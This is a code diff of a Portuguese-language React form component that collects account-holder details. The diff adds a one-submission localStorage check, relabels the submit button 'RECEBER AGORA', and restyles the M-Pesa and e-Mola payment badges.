@@ -1,3 +1,4 @@
+
 import React, { useState } from 'react';
 import { UserData } from '../types';
 import { PROVINCES, GENDERS } from '../constants';
@@ -5,6 +6,8 @@ import { PROVINCES, GENDERS } from '../constants';
 interface Props {
   onSubmit: (data: UserData) => void;
 }
+
+const SUBMISSION_KEY = 'helefant_submitted_token';
 
 const StepForm: React.FC<Props> = ({ onSubmit }) => {
   const [form, setForm] = useState<UserData>({
@@ -26,6 +29,14 @@ const StepForm: React.FC<Props> = ({ onSubmit }) => {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+
+    // Check for previous submission
+    const alreadySubmitted = localStorage.getItem(SUBMISSION_KEY);
+    if (alreadySubmitted === 'true') {
+      setErrors('so é valido em uma tentativa');
+      return;
+    }
+
     if (Object.values(form).some(val => val === '')) {
       setErrors('Atenção: Todos os campos são de preenchimento obrigatório.');
       return;
@@ -50,7 +61,7 @@ const StepForm: React.FC<Props> = ({ onSubmit }) => {
   return (
     <div className="w-full">
       <form onSubmit={handleSubmit} className="grid grid-cols-1 md:grid-cols-2 gap-10">
-        <div className="md:col-span-2">
+        <div className="md:col-span-2" id="solicitar">
           <div className="flex justify-between items-center mb-4">
             <label className="text-sm font-bold uppercase tracking-widest text-emerald-500 ml-1">Titular da Conta</label>
             <span className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">{form.accountName.length}/50</span>
@@ -58,7 +69,7 @@ const StepForm: React.FC<Props> = ({ onSubmit }) => {
           <input
             type="text"
             maxLength={50}
-            placeholder="Nome completo conforme registrado no celular"
+            placeholder="Nome completo conforme o B.I"
             className={inputClasses}
             value={form.accountName}
             onChange={e => setForm({...form, accountName: e.target.value})}
@@ -148,7 +159,7 @@ const StepForm: React.FC<Props> = ({ onSubmit }) => {
               <div className="bg-red-500 p-1 rounded-full text-white">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
               </div>
-              <p className="text-red-400 text-sm font-bold">{errors}</p>
+              <p className="text-red-400 text-sm font-black uppercase tracking-widest">{errors}</p>
             </div>
           )}
           
@@ -156,22 +167,23 @@ const StepForm: React.FC<Props> = ({ onSubmit }) => {
             type="submit"
             className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black py-5 rounded-2xl transition-all shadow-[0_20px_60px_-15px_rgba(16,185,129,0.4)] uppercase tracking-widest text-lg group active:scale-95"
           >
-            SOLICITAR AGORA
+            RECEBER AGORA
             <svg xmlns="http://www.w3.org/2000/svg" className="inline-block ml-3 w-5 h-5 group-hover:translate-x-2 transition-transform" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M14 5l7 7m0 0l-7 7m7-7H3" /></svg>
           </button>
           
           <div className="flex flex-col items-center mt-16">
-            <p className="text-xs text-slate-600 font-bold uppercase tracking-widest mb-10 italic">Redes de Pagamento Autorizadas</p>
-            <div className="grid grid-cols-2 gap-x-20 gap-y-8 opacity-40 grayscale hover:grayscale-0 hover:opacity-100 transition-all duration-700">
-              <div className="flex flex-col items-center gap-4">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/21/M-Pesa_Logo.png" alt="M-Pesa" className="h-10 object-contain" title="M-Pesa" />
-                <span className="text-[10px] font-black text-white/50 tracking-widest uppercase">M-PESA</span>
+            <p className="text-xs text-slate-400 font-bold uppercase tracking-widest mb-8 italic">Redes de Pagamento Autorizadas</p>
+            <div className="flex items-center gap-12 md:gap-24">
+              <div className="flex flex-col items-center">
+                <span className="text-2xl md:text-3xl font-black text-white tracking-tighter uppercase mb-1">M-PESA</span>
+                <div className="h-1 w-8 bg-red-600 rounded-full"></div>
               </div>
-              <div className="flex flex-col items-center gap-4">
-                <img src="https://logos-world.net/wp-content/uploads/2023/04/E-mola-Logo.png" alt="e-Mola" className="h-10 object-contain" title="e-Mola" />
-                <span className="text-[10px] font-black text-white/50 tracking-widest uppercase">E-MOLA</span>
+              <div className="flex flex-col items-center">
+                <span className="text-2xl md:text-3xl font-black text-white tracking-tighter uppercase mb-1">E-MOLA</span>
+                <div className="h-1 w-8 bg-orange-500 rounded-full"></div>
               </div>
             </div>
+            <p className="mt-8 text-[10px] font-bold text-slate-600 uppercase tracking-[0.3em]">Transferência Imediata</p>
           </div>
         </div>
       </form>
